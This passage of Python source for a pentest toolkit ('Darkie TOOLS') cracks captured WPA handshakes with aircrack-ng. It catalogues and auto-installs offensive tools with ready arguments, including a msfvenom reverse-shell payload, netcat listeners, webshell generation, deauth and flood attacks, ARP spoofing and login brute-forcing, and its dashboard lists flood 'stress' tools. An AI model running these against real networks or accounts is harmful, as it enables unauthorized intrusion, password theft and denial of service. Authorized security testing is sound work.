        print(f"  {YELLOW}Try again with better signal or wait for a client to connect.{RESET}\n")
        return
    print(f"  {GREEN}{SYM_CHECK} Handshake captured!{RESET}")
    default_wl = next((w for w in (os.path.expanduser("~/.darkie-tools/wordlist.txt"),
                                   "/usr/share/wordlists/rockyou.txt",
                                   "/usr/share/wordlists/fasttrack.txt",
                                   "/usr/share/john/password.lst") if os.path.exists(w)), "")
    if default_wl:
        print(f"  {c(f'Auto-using wordlist: {default_wl}', MAGENTA)}")
        wl = default_wl
    else:
        print(f"  {YELLOW}No wordlist found. Place one at ~/.darkie-tools/wordlist.txt or type its path.{RESET}")
        while True:
            wl = input(f"  {c(f'Wordlist path {SYM_PROMPT} ', CYAN)}").strip()
            if not wl:
                print(f"  {RED}No wordlist given.{RESET}\n")
                return
            if not os.path.exists(wl):
                print(f"  {YELLOW}File not found: {wl}{RESET}")
                continue
            break
    print(f"  {c(f'Running aircrack-ng against {os.path.basename(wl)} ...', MAGENTA)}")
    cr = subprocess.run(["aircrack-ng", "-b", net["bssid"], "-w", wl, cap], capture_output=True, text=True, timeout=3600)
    out = cr.stdout + cr.stderr
    m = re.search(r"KEY FOUND!\s*\[\s*([^\]\r\n]+)\s*\]", out)
    if m:
        pw = m.group(1).strip()
        print(f"\n  {GREEN}{BOLD}{SYM_CHECK} PASSWORD FOUND: {c(pw, GREEN)}{RESET}")
        print(f"  {c('Network: ' + net['ssid'] + '  (' + net['bssid'] + ')', CYAN)}")
        add_log_alert("INFO", "WiFi", f"Handshake cracked for {net['ssid']}")
    else:
        print(f"  {RED}Password not found in this wordlist.{RESET}")
        print(f"  {YELLOW}Try a larger wordlist (e.g. rockyou.txt) or a rules-based attack.{RESET}")
    print()


def menu_wifi():
    _menu_loop("wifi", "WiFi & Wireless", [
        ("1", "WiFi Network Scanner", wifi_scan),
        ("2", "WiFi Security Audit", wifi_audit),
        ("3", "WPA Handshake Capture & Crack", wifi_password_audit),
        ("b", "Back to main menu", None),
    ], MAGENTA)


# ══════════════════════════════════════════════════════
#  MODULE 16: REPORTS
# ══════════════════════════════════════════════════════

def report_html():
    header_box("Generate HTML Report", CYAN)
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts to report.{RESET}")
        return
    _ensure_save_dir()
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(SAVE_DIR, f"report_{ts}.html")
    sev = {"CRITICAL": "#ff0000", "HIGH": "#ff6600", "WARN": "#ffaa00", "INFO": "#00aa00"}
    html = f"""<!DOCTYPE html><html><head><title>{APP_NAME} Report</title>
<style>body{{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px}}
h1{{color:#00ffff;border-bottom:2px solid #00ffff}}table{{width:100%;border-collapse:collapse;margin:10px 0}}
th,td{{border:1px solid #333;padding:8px;text-align:left}}th{{background:#111;color:#00ffff}}
.critical{{color:#ff0000;font-weight:bold}}.high{{color:#ff6600}}.warn{{color:#ffaa00}}.info{{color:#00aa00}}
</style></head><body><h1>{APP_NAME} Report</h1>
<p>Generated: {dt.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p>Total Alerts: {len(LOG_ALERTS)}</p>
<table><tr><th>Time</th><th>Level</th><th>Source</th><th>Message</th></tr>"""
    for a in LOG_ALERTS:
        cls = a["level"].lower()
        html += f'<tr><td>{a["timestamp"]}</td><td class="{cls}">{a["level"]}</td><td>{a["source"]}</td><td>{a["message"]}</td></tr>\n'
    html += "</table></body></html>"
    with open(path, "w") as f:
        f.write(html)
    print(f"  {GREEN}{SYM_CHECK} Report saved: {path}{RESET}")
    print()


def report_export(fmt):
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts.{RESET}")
        return
    _ensure_save_dir()
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(SAVE_DIR, f"alerts_{ts}.{fmt}")
    if fmt == "json":
        with open(path, "w") as f:
            json.dump(LOG_ALERTS, f, indent=2)
    else:
        with open(path, "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=["timestamp", "level", "source", "message"])
            w.writeheader()
            w.writerows(LOG_ALERTS)
    print(f"  {GREEN}{SYM_CHECK} Saved: {path}{RESET}")
    print()


def menu_reports():
    _menu_loop("reports", "Report Generator", [
        ("1", "Generate HTML Report", report_html),
        ("2", "Export to JSON", lambda: report_export("json")),
        ("3", "Export to CSV", lambda: report_export("csv")),
        ("b", "Back to main menu", None),
    ], CYAN)


# ══════════════════════════════════════════════════════
#  MODULE 18: NATIVE TOOLBOX  (v5 — system-installed tools)
# ══════════════════════════════════════════════════════
# Auto-detects the security tools already installed on this OS and launches
# them ready-to-use (nmap, masscan, sqlmap, hydra, hashcat, metasploit, ...).
# Only tools that are actually present are shown, so on Kali almost everything
# below is ready with zero setup.

NATIVE_CATS = [
    ("Scanning & Recon", RED),
    ("Web & Application", BLUE),
    ("Exploitation", MAGENTA),
    ("Password Cracking", YELLOW),
    ("Wireless", GREEN),
    ("Network & Sniffing", CYAN),
    ("Forensics & OSINT", MAGENTA),
    ("Post-Exploitation", RED),
]

# tool: (category_index, short_desc, example_args, needs_root)
NATIVE_TOOLS = {
    # ── Scanning & Recon (0) ──────────────────────────────
    "nmap":      (0, "Network discovery, port & service scan", "-sV -sC <target>", False),
    "masscan":   (0, "Ultra-fast internet-scale port scanner", "<range> -p1-65535 --rate=1000", True),
    "whois":     (0, "Domain / IP registration records", "<domain>", False),
    "dnsrecon":  (0, "DNS enumeration & zone transfer", "-d <domain>", False),
    "dnsenum":   (0, "DNS brute-force & reverse lookup", "<domain>", False),
    "fierce":    (0, "DNS recon with brute-force", "--domain <domain>", False),
    "theHarvester": (0, "Emails, subdomains & hosts (passive)", "-d <domain> -b all", False),
    "recon-ng":  (0, "Modular OSINT recon framework", "", False),
    "amass":     (0, "Attack-surface enumeration (OWASP)", "enum -d <domain>", False),
    "legion":    (0, "Auto network pentest / recon suite", "", False),
    "sublist3r": (0, "Subdomain discovery", "-d <domain>", False),
    "gobuster":  (0, "Dir/dns/vhost brute-force", "dir -u <url> -w /usr/share/wordlists/dirb/common.txt", False),
    "dirb":      (0, "Web content scanner", "<url> /usr/share/wordlists/dirb/common.txt", False),
    "ffuf":      (0, "Fast web fuzzer", "-u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt", False),
    "nikto":     (0, "Web server vulnerability scanner", "-h <target>", False),
    "wpscan":    (0, "WordPress vulnerability scanner", "--url <url> --enumerate vp", False),
    # ── Web & Application (1) ──────────────────────────────
    "sqlmap":    (1, "SQL injection automation", "-u <url> --batch --crawl=2", False),
    "commix":    (1, "Command injection tester", "--url <url>", False),
    "xsser":     (1, "Cross-site scripting scanner", "-u <url>", False),
    "weevely":   (1, "Stealth PHP webshell", "generate <pass> shell.php", False),
    "hash-identifier": (1, "Detect hash type from a hash", "", False),
    # ── Exploitation (2) ───────────────────────────────────
    "msfconsole": (2, "Metasploit framework console", "", False),
    "msfvenom":  (2, "Payload generator / encoder", "-p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf", False),
    "searchsploit": (2, "Search Exploit-DB locally", "sploitdb", False),
    "setoolkit": (2, "Social-Engineer Toolkit", "", True),
    "beef-xss":  (2, "Browser exploitation framework", "", False),
    # ── Password Cracking (3) ──────────────────────────────
    "john":      (3, "John the Ripper password cracker", "hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt", False),
    "hashcat":   (3, "GPU/CPU hash cracking", "-m 0 hash.txt /usr/share/wordlists/rockyou.txt", False),
    "hydra":     (3, "Online login brute-forcer", "-l admin -P /usr/share/wordlists/rockyou.txt <target> ssh", False),
    "medusa":    (3, "Parallel login brute-forcer", "-h <target> -u admin -P /usr/share/wordlists/rockyou.txt -M ssh", True),
    "ncrack":    (3, "High-speed network auth cracker", "-u admin -P /usr/share/wordlists/rockyou.txt <target>:22", False),
    "crunch":    (3, "Generate wordlists", "4 8 abc123 -o wordlist.txt", False),
    "cewl":      (3, "Harvest words from a website", "<url> -w words.txt", False),
    # ── Wireless (4) ───────────────────────────────────────
    "aircrack-ng": (4, "WPA/WEP key cracker", "capture.cap -w /usr/share/wordlists/rockyou.txt", True),
    "aireplay-ng": (4, "Replay / deauth attacks", "--deauth 5 -a <bssid> <iface>", True),
    "airodump-ng": (4, "Capture 802.11 traffic", "<iface>", True),
    "reaver":    (4, "WPS PIN brute-force", "-i <iface> -b <bssid>", True),
    "bully":     (4, "WPS brute-force (alternative)", "-b <bssid> <iface>", True),
    "wifite":    (4, "Automated wifi auditing", "--all", True),
    "macchanger": (4, "Spoof MAC address", "-r <iface>", True),
    "mdk3":      (4, "802.11 DoS / beacon flood", "<iface> a", True),
    "mdk4":      (4, "mdk3 successor", "<iface> a", True),
    # ── Network & Sniffing (5) ─────────────────────────────
    "tcpdump":   (5, "Packet capture (CLI)", "-i <iface> -w capture.pcap", True),
    "tshark":    (5, "Wireshark CLI packet analyzer", "-i <iface> -f tcp", True),
    "wireshark": (5, "Graphical packet analyzer", "", False),
    "netcat":    (5, "Swiss-army networking (nc)", "-lvnp 4444", False),
    "nc":        (5, "netcat (alias)", "-lvnp 4444", False),
    "ncat":      (5, "nmap's netcat", "-lvnp 4444", False),
    "socat":     (5, "Multi-protocol relay", "-v TCP-LISTEN:4444,fork", False),
    "hping3":    (5, "TCP/IP packet assembler", "-S -p 80 <target>", True),
    "arpspoof":  (5, "ARP spoofing (MITM)", "-i <iface> -t <victim> <gateway>", True),
    "ettercap":  (5, "MITM suite", "-T -M arp:remote /<victim>// /<gateway>//", True),
    "dsniff":    (5, "Network sniffing tools", "", True),
    "bettercap": (5, "Modern MITM framework", "-eval 'net.sniff on'", True),
    "responder": (5, "LLMNR/NBT-NS poisoner", "-I <iface> -wv", True),
    # ── Forensics & OSINT (6) ─────────────────────────────
    "binwalk":   (6, "Firmware / file carving", "<file>", False),
    "exiftool":  (6, "Read/write metadata", "<file>", False),
    "foremost":  (6, "File carving from images", "-i <file> -o out/", True),
    "steghide":  (6, "Hide/extract data in media", "extract -sf <file>", False),
    "strings":   (6, "Extract ASCII strings", "<file>", False),
    "enum4linux": (6, "Windows/SMB enumeration", "<target>", False),
    "smbmap":    (6, "SMB share enumeration", "-H <target>", False),
    "ldapsearch": (6, "LDAP query tool", "-x -H ldap://<target> -b dc=example,dc=com", False),
    # ── Post-Exploitation (7) ──────────────────────────────
    "evil-winrm": (7, "WinRM shell (credentialed)", "-i <target> -u admin -p pass", False),
    "crackmapexec": (7, "Network service pwn tool", "smb <target> -u admin -p pass", False),
    "chisel":    (7, "TCP tunnel / port forward", "client <server>:8080 R:4444:127.0.0.1:22", False),
}


def _native_catalog():
    seen = set()
    out = []
    for name, (cat, desc, example, root) in NATIVE_TOOLS.items():
        if name in seen:
            continue
        seen.add(name)
        out.append((name, cat, desc, example, root))
    return out


def _native_installed():
    """Return {tool_name: path} for every installed tool in the catalog."""
    return {name: shutil.which(name) for name, *_ in _native_catalog()}


def _native_status():
    found = _native_installed()
    return len([p for p in found.values() if p]), len(found)


# ── Auto-install recipes so the Toolbox works on EVERY OS (not just Kali) ──
# tool: (apt_pkg, brew_pkg, choco_pkg, pip_pkg)  — "" means "use the tool name"
NATIVE_INSTALL = {
    "nmap": ("nmap", "nmap", "nmap", ""),
    "masscan": ("masscan", "masscan", "masscan", ""),
    "whois": ("whois", "whois", "whois", ""),
    "dnsrecon": ("dnsrecon", "dnsrecon", "dnsrecon", ""),
    "dnsenum": ("dnsenum", "dnsenum", "dnsenum", ""),
    "fierce": ("fierce", "fierce", "fierce", ""),
    "theHarvester": ("theharvester", "theharvester", "", "theHarvester"),
    "recon-ng": ("recon-ng", "recon-ng", "", "recon-ng"),
    "amass": ("amass", "amass", "amass", "amass"),
    "legion": ("legion", "legion", "", "legion"),
    "sublist3r": ("sublist3r", "sublist3r", "", "sublist3r"),
    "gobuster": ("gobuster", "gobuster", "gobuster", ""),
    "dirb": ("dirb", "dirb", "dirb", ""),
    "ffuf": ("ffuf", "ffuf", "ffuf", ""),
    "nikto": ("nikto", "nikto", "nikto", ""),
    "wpscan": ("wpscan", "wpscan", "", "wpscan"),
    "sqlmap": ("sqlmap", "sqlmap", "sqlmap", "sqlmap"),
    "commix": ("commix", "", "", "commix"),
    "xsser": ("xsser", "xsser", "", ""),
    "weevely": ("weevely", "", "", "weevely"),
    "hash-identifier": ("hash-identifier", "", "", "hashid"),
    "msfconsole": ("metasploit-framework", "metasploit", "metasploit", ""),
    "msfvenom": ("metasploit-framework", "metasploit", "metasploit", ""),
    "searchsploit": ("exploitdb", "exploitdb", "", ""),
    "setoolkit": ("set", "", "", ""),
    "beef-xss": ("beef-xss", "beef", "beef", ""),
    "john": ("john", "john", "john-the-ripper", ""),
    "hashcat": ("hashcat", "hashcat", "hashcat", ""),
    "hydra": ("hydra", "hydra", "hydra", ""),
    "medusa": ("medusa", "medusa", "medusa", ""),
    "ncrack": ("ncrack", "ncrack", "ncrack", ""),
    "crunch": ("crunch", "crunch", "", ""),
    "cewl": ("cewl", "cewl", "", ""),
    "aircrack-ng": ("aircrack-ng", "aircrack-ng", "aircrack-ng", ""),
    "aireplay-ng": ("aircrack-ng", "aircrack-ng", "aircrack-ng", ""),
    "airodump-ng": ("aircrack-ng", "aircrack-ng", "aircrack-ng", ""),
    "reaver": ("reaver", "reaver", "", ""),
    "bully": ("bully", "", "", ""),
    "wifite": ("wifite", "wifite", "", ""),
    "macchanger": ("macchanger", "macchanger", "", ""),
    "mdk3": ("mdk3", "", "", ""),
    "mdk4": ("mdk4", "", "", ""),
    "tcpdump": ("tcpdump", "tcpdump", "tcpdump", ""),
    "tshark": ("tshark", "tshark", "wireshark", ""),
    "wireshark": ("wireshark", "wireshark", "wireshark", ""),
    "netcat": ("netcat-openbsd", "netcat", "netcat", ""),
    "nc": ("netcat-openbsd", "netcat", "netcat", ""),
    "ncat": ("nmap", "nmap", "nmap", ""),
    "socat": ("socat", "socat", "socat", ""),
    "hping3": ("hping3", "hping3", "", ""),
    "arpspoof": ("dsniff", "dsniff", "", ""),
    "ettercap": ("ettercap", "ettercap", "ettercap", ""),
    "dsniff": ("dsniff", "dsniff", "", ""),
    "bettercap": ("bettercap", "bettercap", "", "bettercap"),
    "responder": ("responder", "responder", "", "responder"),
    "binwalk": ("binwalk", "binwalk", "binwalk", ""),
    "exiftool": ("exiftool", "exiftool", "exiftool", ""),
    "foremost": ("foremost", "foremost", "", ""),
    "steghide": ("steghide", "steghide", "", ""),
    "strings": ("binutils", "binutils", "", ""),
    "enum4linux": ("enum4linux", "enum4linux", "", "enum4linux"),
    "smbmap": ("smbmap", "smbmap", "", "smbmap"),
    "ldapsearch": ("ldap-utils", "openldap", "", ""),
    "evil-winrm": ("evil-winrm", "evil-winrm", "", ""),
    "crackmapexec": ("crackmapexec", "", "", "crackmapexec"),
    "chisel": ("chisel", "chisel", "", ""),
}


def _pkg_manager():
    """Detect the OS package manager: apt / dnf / pacman / brew / choco / winget / pip."""
    if platform.system().lower() == "windows":
        if _which("choco"):
            return "choco"
        if _which("winget"):
            return "winget"
        return None
    if _which("apt-get"):
        return "apt"
    if _which("dnf"):
        return "dnf"
    if _which("pacman"):
        return "pacman"
    if _which("brew"):
        return "brew"
    return None


def _native_install(tool):
    """Install one Toolbox tool using the OS package manager (or pip)."""
    recipe = NATIVE_INSTALL.get(tool)
    if not recipe:
        print(f"  {YELLOW}No install recipe for {tool}.{RESET}")
        return
    apt_pkg, brew_pkg, choco_pkg, pip_pkg = recipe
    pm = _pkg_manager()
    pkg = ""
    if pm == "apt":
        pkg = apt_pkg or tool
    elif pm in ("dnf", "pacman"):
        pkg = apt_pkg or tool
    elif pm == "brew":
        pkg = brew_pkg or tool
    elif pm in ("choco", "winget"):
        pkg = choco_pkg or tool

    if pm in ("apt", "dnf", "pacman", "brew", "choco", "winget") and pkg:
        if pm == "apt":
            cmd = ["apt-get", "install", "-y", pkg]
            if not _is_root() and _which("sudo"):
                cmd = ["sudo"] + cmd
        elif pm == "dnf":
            cmd = ["dnf", "install", "-y", pkg]
            if not _is_root() and _which("sudo"):
                cmd = ["sudo"] + cmd
        elif pm == "pacman":
            cmd = ["pacman", "-S", "--noconfirm", pkg]
            if not _is_root() and _which("sudo"):
                cmd = ["sudo"] + cmd
        elif pm == "brew":
            cmd = ["brew", "install", pkg]
        elif pm == "choco":
            cmd = ["choco", "install", "-y", pkg]
        else:
            cmd = ["winget", "install", "--accept-package-agreements", "--accept-source-agreements", pkg]
        print(f"  {c('Installing: ' + ' '.join(cmd), CYAN)}  (may ask for your password)\n")
        try:
            subprocess.call(cmd)
        except Exception as e:
            print(f"  {RED}{SYM_X} {e}{RESET}")
        if _which(tool):
            print(f"  {GREEN}{SYM_CHECK} {tool} installed successfully.{RESET}")
        else:
            print(f"  {YELLOW}{SYM_WARN} {tool} still not found. Try: {' '.join(cmd)} manually, or use pip:{RESET}")
    elif pip_pkg:
        _py = _which("python3") or _which("python")
        if not _py:
            print(f"  {YELLOW}pip not available.{RESET}")
            return
        print(f"  {c(f'Installing via pip: {pip_pkg}', CYAN)}\n")
        try:
            subprocess.call([_py, "-m", "pip", "install", "--user", pip_pkg])
        except Exception as e:
            print(f"  {RED}{SYM_X} {e}{RESET}")
        if _which(tool):
            print(f"  {GREEN}{SYM_CHECK} {tool} installed successfully.{RESET}")
    else:
        print(f"  {YELLOW}No package-manager recipe for {tool} on this OS. Install it manually.{RESET}")
    print()
    input(f"  {c('Press Enter to continue...', CYAN)}")


def _native_install_all():
    """Offer to install every missing Toolbox tool (Kali/Ubuntu/macOS/Windows)."""
    found = _native_installed()
    missing = [name for name, *_ in _native_catalog() if not found.get(name)]
    if not missing:
        print(f"  {GREEN}{SYM_CHECK} All Toolbox tools are already installed.{RESET}")
        print()
        input(f"  {c('Press Enter to continue...', CYAN)}")
        return
    print(f"  {c(f'{len(missing)} tools are missing on this OS:', YELLOW)}")
    print(f"  {c(', '.join(missing), DIM)}")
    print(f"  {c('The installer will download them with your OS package manager' + (f' ({_pkg_manager() or "pip"})' if _pkg_manager() else ' (pip)') + '.', CYAN)}")
    if not _yes("Install all missing tools now? (needs internet + maybe admin)"):
        return
    for name in missing:
        print(f"\n  {c(SYM_ARROW + ' Installing ' + name + ' ...', GREEN)}")
        _native_install(name)
    print(f"  {GREEN}{SYM_CHECK} Done. Reopen the Toolbox to use the newly installed tools.{RESET}")


def _native_launch(tool, needs_root, example):
    path = _native_installed().get(tool)
    if not path:
        print(f"  {RED}{SYM_X} {tool} not installed on this system.{RESET}")
        if _yes(f"Install {tool} automatically now? (uses your OS package manager)"):
            _native_install(tool)
            path = _native_installed().get(tool)
        if not path:
            return
    print(f"  {c(f'Launching {tool} — {path}', GREEN)}")
    print(f"  {c(f'Example: {tool} {example}', DIM)}" if example else "")
    if needs_root and not _is_root():
        print(f"  {YELLOW}{SYM_WARN} This tool usually needs root. sudo will be used if available.{RESET}")
    args = _get("Args (or leave empty to run with defaults)")
    cmd = [path]
    if needs_root and not _is_root() and _which("sudo"):
        cmd = ["sudo"] + cmd
    if args:
        try:
            import shlex
            cmd += shlex.split(args)
        except Exception:
            cmd.append(args)
    print(f"  {c('Running: ' + ' '.join(cmd), CYAN)}  (Ctrl+C to stop)\n")
    try:
        subprocess.call(cmd)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()
    input(f"  {c('Press Enter to continue...', CYAN)}")


def menu_native():
    found = _native_installed()
    cats = list(NATIVE_CATS)
    while True:
        avail, total = _native_status()
        header_box(f"Native Toolbox — {avail}/{total} tools detected on this OS", GREEN)
        print(f"  {DIM}Launches the real security tools installed on your system, ready-to-use.{RESET}")
        for i, (cat_name, color) in enumerate(cats, start=1):
            have = sum(1 for name, c, *_ in _native_catalog() if c == i - 1 and found.get(name))
            print(f"  {c(f'[{i}]', color)}  {cat_name:<24} {c(f'({have} ready)', GREEN if have else RED)}")
        print(f"  {c('[a]', YELLOW)}  Show ALL installed tools")
        print(f"  {c('[i]', YELLOW)}  Install ALL missing tools (auto-detects your OS)")
        print(f"  {c('[b]', YELLOW)}  Back to main menu")
        print()
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip().lower()
        if ch == "b":
            break
        if ch == "a":
            _native_list_all(found)
            continue
        if ch == "i":
            _native_install_all()
            found = _native_installed()
            continue
        if ch.isdigit() and 1 <= int(ch) <= len(cats):
            cat_idx = int(ch) - 1
            tools = [(n, d, e, r) for n, c, d, e, r in _native_catalog() if c == cat_idx]
            _native_pick(found, tools, cats[cat_idx][0])
        else:
            print(f"  {RED}Invalid choice.{RESET}")


def _native_list_all(found):
    header_box("All detected native tools", GREEN)
    by_cat = {}
    for name, c, desc, example, root in _native_catalog():
        by_cat.setdefault(c, []).append((name, desc, example, root))
    for c, (cat_name, _) in enumerate(NATIVE_CATS):
        items = by_cat.get(c, [])
        if not items:
            continue
        print(f"\n  {c(cat_name.upper(), GREEN)}")
        for name, desc, example, root in items:
            if found.get(name):
                print(f"    {c(SYM_CHECK, GREEN)} {c(name, CYAN)}  {DIM}{desc}{RESET}")
            else:
                print(f"    {c(SYM_X, RED)} {c(name, RED)}  {DIM}{desc}{RESET}")
    print()
    input(f"  {c('Press Enter to continue...', CYAN)}")


def _native_pick(found, tools, cat_name):
    handlers = {name: (name, desc, example, root) for name, desc, example, root in tools}
    items = [(name, desc, example, root) for name, desc, example, root in tools]
    while True:
        header_box(f"Native Toolbox — {cat_name}", GREEN)
        for i, (name, desc, example, root) in enumerate(items, start=1):
            path = found.get(name)
            mark = c(SYM_CHECK, GREEN) if path else c(SYM_X, RED)
            print(f"  {c(f'[{i}]', GREEN)} {mark} {c(name, CYAN):<14} {DIM}{desc}{RESET}")
        print(f"  {c('[b]', YELLOW)}  Back")
        print()
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip().lower()
        if ch == "b":
            break
        if ch.isdigit() and 1 <= int(ch) <= len(items):
            _native_launch(*handlers[items[int(ch) - 1][0]])
        else:
            print(f"  {RED}Invalid choice.{RESET}")


# ══════════════════════════════════════════════════════
#  WEB DASHBOARD + DESKTOP GUI
# ══════════════════════════════════════════════════════

DASHBOARD_TOOLS = [
    ("Network & Threat", [
        ("Packet Capture", "net_capture"), ("Traffic Monitor", "net_traffic_monitor"),
        ("IDS Detection", "net_ids"), ("ARP Spoof Detect", "net_arp_detect"),
        ("Port-Scan Detect", "net_portscan_detect"), ("DDoS Detect", "net_ddos_detect"),
    ]),
    ("Endpoint Security", [
        ("Process Monitor", "ep_process_monitor"), ("Suspicious Process", "ep_suspicious_processes"),
        ("File Integrity", "ep_file_integrity"), ("Net Connections", "ep_network_connections"),
    ]),
    ("Vulnerability Mgmt", [
        ("Advanced Port Scan", "vuln_advanced_scan"), ("CVE Lookup", "vuln_cve_lookup"),
        ("Vuln Assessment (nmap)", "vuln_assessment"), ("Config Checker", "vuln_config_check"),
    ]),
    ("Data & Access", [
        ("File Encrypt/Decrypt", "data_encrypt"), ("Password Strength", "data_password_strength"),
        ("Brute-Force Detect", "data_bruteforce_detect"),
    ]),
    ("Ethical Pentest", [
        ("SQLi Detector", "pentest_sqli"), ("XSS Scanner", "pentest_xss"),
        ("HTTP Methods Fuzzer", "pentest_http_methods"), ("Login Brute-Force", "pentest_login_bruteforce"),
    ]),
    ("SIEM & Logs", [
        ("Log Analyzer", "siem_log_analyzer"), ("Real-time Log Monitor", "siem_realtime"),
        ("Alert Dashboard", "siem_alert_viewer"),
    ]),
    ("Stress Testing", [
        ("Minecraft Stress", "stress_minecraft"), ("Web Stress", "stress_http"),
        ("IP Flood", "stress_ip"),
    ]),
    ("OSINT Recon", [
        ("Phone Lookup", "osint_phone"), ("Email OSINT", "osint_email"),
        ("IP Geolocation", "osint_ipgeo"), ("DNS Enum", "osint_dns"),
        ("Subdomain Discovery", "osint_subdomain"), ("Website Recon", "osint_website"),
        ("Whois", "osint_whois"),
    ]),
    ("Telephone", [
        ("Analyze Number", "tel_analyze"), ("Format Number", "tel_format"),
    ]),
    ("Network Utils", [
        ("Port Scanner", "legacy_portscan"), ("SSL/TLS Check", "legacy_sslcheck"),
        ("HTTP Headers", "legacy_httpheaders"), ("Ping", "legacy_ping"),
        ("Traceroute", "legacy_traceroute"),
    ]),
    ("Hash & Crypto", [
        ("Hash Generator", "hash_generator"), ("Hash Identifier", "hash_identifier"),
        ("Hash Cracker", "hash_cracker"), ("Encoder/Decoder", "encoder_decoder"),
        ("Password Generator", "password_generator"),
    ]),
    ("System Audit", [
        ("Rootkit Detection", "audit_rootkit"), ("SUID/SGID Scan", "audit_suid"),
        ("Cron Analyzer", "audit_cron"), ("Kernel Hardening", "audit_kernel"),
    ]),
    ("Advanced Network", [
        ("Port Knocking", "adv_port_knock"), ("Banner Grab", "adv_banner"),
        ("Reverse Shell Detect", "adv_revshell"), ("LAN Discovery", "adv_lan_discovery"),
    ]),
    ("Advanced OSINT", [
        ("Cert Transparency", "osint_ct_log"), ("DNS History", "osint_dns_history"),
        ("Wayback Machine", "osint_wayback"), ("Recon Engine", "osint_recon_engine"),
    ]),
    ("WiFi & Wireless", [
        ("WiFi Scanner", "wifi_scan"), ("WiFi Security Audit", "wifi_audit"),
        ("WPA Handshake/Crack", "wifi_password_audit"),
    ]),
    ("Reports", [
        ("HTML Report", "report_html"),
    ]),
    ("Native Toolbox", [
        ("Scanning & Recon", "menu_native"), ("Password Cracking", "menu_native"),
        ("Web & Application", "menu_native"), ("Wireless", "menu_native"),
        ("Exploitation", "menu_native"), ("Network & Sniffing", "menu_native"),
    ]),
]


class InteractiveSession:
    """Runs a tool in a thread and bridges its input()/print() to a UI."""

    def __init__(self):
        self._lines = []
        self._lock = threading.Lock()
        self._acc = ""
        self.running = False
        self.tool_name = ""
        self._stop = threading.Event()
        self._prompt_evt = threading.Event()
        self._have_answer = threading.Event()
        self._prompt = ""
        self._answer = None

    class _Stream:
        def __init__(self, sess):
            self._sess = sess

        def write(self, data):
            self._sess._raw(data)
            return len(data)

        def flush(self):
            pass

    def _emit(self, tag, text):
        with self._lock:
            self._lines.append((tag, text))
            if len(self._lines) > 3000:
                del self._lines[: len(self._lines) - 3000]

    def _raw(self, chunk):
        with self._lock:
            self._acc += chunk
            while "\n" in self._acc:
                line, self._acc = self._acc.split("\n", 1)
                self._lines.append(("out", line.rstrip("\r")))
                if len(self._lines) > 3000:
                    del self._lines[: len(self._lines) - 3000]

    @staticmethod
    def _strip(s):
        return re.sub(r"\x1b\[[0-9;]*m", "", s)

    def ask(self, prompt=""):
        if self._stop.is_set():
            return ""
        self._prompt = self._strip(prompt or "")
        if self._prompt:
            self._emit("in", self._prompt.rstrip())
        self._prompt_evt.set()
        self._have_answer.clear()
        self._have_answer.wait()
        ans = self._answer if self._answer is not None else ""
        self._answer = None
        self._prompt_evt.clear()
        self._emit("in", self._strip(ans))
        return ans

    def wants_input(self):
        return self._prompt if self._prompt_evt.is_set() else None

    def answer(self, value):
        self._answer = value
        self._have_answer.set()

    def stop(self):
        self._stop.set()
        self._answer = ""
        self._have_answer.set()

    def start(self, funcname, label):
        if self.running:
            return False
        fn = globals().get(funcname)
        if not callable(fn):
            return False
        with self._lock:
            self._lines = []
        self._acc = ""
        self._stop.clear()
        self._have_answer.clear()
        self._prompt_evt.clear()
        self._answer = None
        self.running = True
        self.tool_name = label or funcname
        threading.Thread(target=self._run, args=(fn,), daemon=True).start()
        return True

    def _run(self, fn):
        import builtins as _b, sys as _sys
        stream = self._Stream(self)
        old_out, old_in = _sys.stdout, _b.input
        _sys.stdout = stream
        _b.input = self.ask
        try:
            fn()
            self._emit("tag", f"[+] {self.tool_name} completed")
        except KeyboardInterrupt:
            self._emit("warn", "[!] interrupted")
        except Exception as e:
            self._emit("err", f"[!] Error: {e}")
        finally:
            _sys.stdout = old_out
            _b.input = old_in
            self.running = False
            self.tool_name = ""

    def snapshot(self, pos):
        with self._lock:
            lines = list(self._lines)
        return lines[pos:], len(lines)

_WEB_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Darkie TOOLS — v5 console</title>
<style>
:root{
  --bg:#080b10; --panel2:#0f141c; --line:#1b2333; --line2:#263149;
  --text:#dfe6f2; --muted:#8b95a9; --faint:#5b6478;
  --acc:#2fe6a3; --accdim:#1e9c74; --amber:#ffb454; --red:#ff5c69;
  --mono:ui-monospace,"SFMono-Regular","Cascadia Code","JetBrains Mono",Consolas,"Liberation Mono",monospace;
  --sans:"Inter","Segoe UI",system-ui,-apple-system,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{background:var(--bg);color:var(--text);font-family:var(--sans);display:flex;flex-direction:column;overflow:hidden;
  background-image:radial-gradient(60rem 40rem at 88% -12%,rgba(47,230,163,.055),transparent 60%),
                   radial-gradient(52rem 34rem at -8% 112%,rgba(110,168,255,.045),transparent 60%)}
/* ---------------- header ---------------- */
header{flex:none;display:flex;align-items:center;gap:16px;height:58px;padding:0 22px;border-bottom:1px solid var(--line)}
.brand{display:flex;align-items:center;gap:12px;user-select:none}
.mark{width:28px;height:28px;border-radius:8px;display:grid;place-items:center;font-family:var(--mono);font-weight:800;font-size:15px;
  color:var(--acc);background:linear-gradient(145deg,#0e251d,#081410);border:1px solid rgba(47,230,163,.45);box-shadow:0 0 0 3px rgba(47,230,163,.06)}
.name{font-size:15px;font-weight:800;letter-spacing:.2px}
.ver{font:10.5px var(--mono);color:var(--faint);border-left:1px solid var(--line2);padding-left:10px;align-self:center}
.status{margin-left:auto;display:flex;align-items:center;gap:8px;font:11.5px var(--mono);color:var(--faint)}
